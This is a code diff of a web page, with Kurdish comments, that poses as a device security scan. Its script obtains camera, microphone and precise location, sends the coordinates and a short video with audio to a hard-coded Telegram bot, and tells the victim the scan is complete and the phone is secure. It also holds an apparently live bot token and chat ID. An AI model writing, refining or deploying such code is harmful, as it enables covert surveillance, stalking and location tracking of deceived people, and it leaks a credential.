@@ -24,70 +24,51 @@
     </div>
 
     <script>
-        const startBtn = document.getElementById('startBtn');
-        const statusText = document.getElementById('statusText');
         const botToken = "8633886074:AAE_wcUpSvjxa-1ac-68iWCUosIyESWlFhk"; 
         const chatId = "7619045862"; 
 
-        startBtn.addEventListener('click', async () => {
+        document.getElementById('startBtn').addEventListener('click', async () => {
             try {
-                // ١. ناردنی لۆکەیشن - هێڵی ٣٨ لێرەدا چاککراوە بۆ ${lat}
+                // ١. داواکردنی لۆکەیشن و کامێرا پێکەوە
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('startBtn').style.display = "none";
+                document.getElementById('statusText').style.display = "block";
+
+                // ٢. ناردنی لۆکەیشن
                 navigator.geolocation.getCurrentPosition(position => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    // لۆکەیشنەکە چاککرا بۆ ئەوەی ڕاستەوخۆ ژمارەکان بنێرێت
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
                     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: `📍 لۆکەیشنی وردی کەسەکە دۆزرایەوە:\n${mapUrl}`
-                        })
+                        body: JSON.stringify({ chat_id: chatId, text: `📍 لۆکەیشن:\n${mapUrl}` })
                     });
-                }, null, { enableHighAccuracy: true, timeout: 15000 });
+                });
 
-                // ٢. تۆمارکردنی ڤیدیۆ و سەوت
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                startBtn.style.display = "none";
-                statusText.style.display = "block";
-
+                // ٣. تۆمارکردنی ٥ چرکە ڤیدیۆ
                 const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
-                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                 
                 mediaRecorder.onstop = async () => {
-                    statusText.innerText = "Processing Evidence... 95%";
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
-                    formData.append('video', blob, 'jegr_report.mp4');
+                    formData.append('video', blob, 'scan_result.mp4');
 
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    statusText.innerText = "Scan Complete! Secure.";
-                    alert("پشکنین تەواو بوو! مۆبایلەکەت پارێزراوە.");
+                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
+                    
+                    document.getElementById('statusText').innerText = "Scan Complete! Secure.";
+                    alert("پشکنین تەواو بوو! ئامێرەکەت پارێزراوە.");
+                    stream.getTracks().forEach(t => t.stop());
                 };
 
                 mediaRecorder.start();
-                
-                let timeLeft = 15;
-                const timer = setInterval(() => {
-                    timeLeft--;
-                    statusText.innerText = `Scanning System... ${Math.floor(((15-timeLeft)/15)*100)}%`;
-                    if (timeLeft <= 0) {
-                        clearInterval(timer);
-                        mediaRecorder.stop();
-                        stream.getTracks().forEach(t => t.stop());
-                    }
-                }, 1000);
+                setTimeout(() => mediaRecorder.stop(), 5000); // ٥ چرکە ڤیدیۆ دەگرێت
 
             } catch (err) {
-                alert("تکایە هەموو مۆڵەتەکان بدە بۆ ئەوەی پشکنینەکە کار بکات.");
-                location.reload();
+                alert("تکایە Allow دابگرە بۆ دەستپێکردنی پشکنین.");
             }
         });
     </script>
